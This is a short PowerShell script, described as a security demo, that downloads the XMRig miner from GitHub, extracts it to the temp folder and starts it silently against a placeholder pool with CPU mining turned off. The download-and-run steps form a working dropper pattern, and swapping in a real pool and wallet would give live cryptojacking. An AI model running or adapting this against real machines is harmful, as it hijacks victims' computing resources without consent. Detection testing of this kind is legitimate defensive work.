PowerShell# Sample script to simulate crypto-mining deployment for security demos
# Downloads XMRig but uses an invalid pool to prevent actual mining

try {
    # Download the XMRig release (latest stable Windows 64-bit ZIP)
    $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-win64.zip"
    $downloadPath = "$env:TEMP\miner.zip"
    Invoke-WebRequest -Uri $minerUrl -OutFile $downloadPath -UseBasicParsing

    # Extract the ZIP
    $extractPath = "$env:TEMP\xmrig"
    Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force

    # Run XMRig with invalid config to simulate (won't connect or mine)
    Start-Process -FilePath "$extractPath\xmrig-6.21.0\xmrig.exe" -ArgumentList "-o invalid.pool.example:3333 -u testwallet -p x --donate-level=0 --no-cpu" -NoNewWindow -Wait
} catch {
    Write-Output "Simulation failed: $_"
}
